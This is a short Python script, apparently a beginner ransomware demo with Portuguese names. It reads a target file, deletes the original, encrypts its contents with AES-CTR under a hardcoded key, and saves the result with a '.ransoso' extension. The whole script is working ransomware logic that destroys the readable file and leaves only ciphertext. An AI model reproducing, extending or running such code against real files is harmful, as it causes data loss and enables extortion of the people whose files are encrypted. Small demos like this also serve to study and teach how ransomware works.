import os
import pyaes as ps

file_name = 'alvo.txt'
file = open(file_name, 'rb')
data = file.read()
file.close()

os.remove(file_name)

key = b'alvosransomwares'
aes = ps.AESModeOfOperationCTR(key)

crypto_data = aes.encrypt(data)

new_file = file_name + '.ransoso'
new_file = open(new_file, 'wb')
new_file.write(crypto_data)
new_file.close()
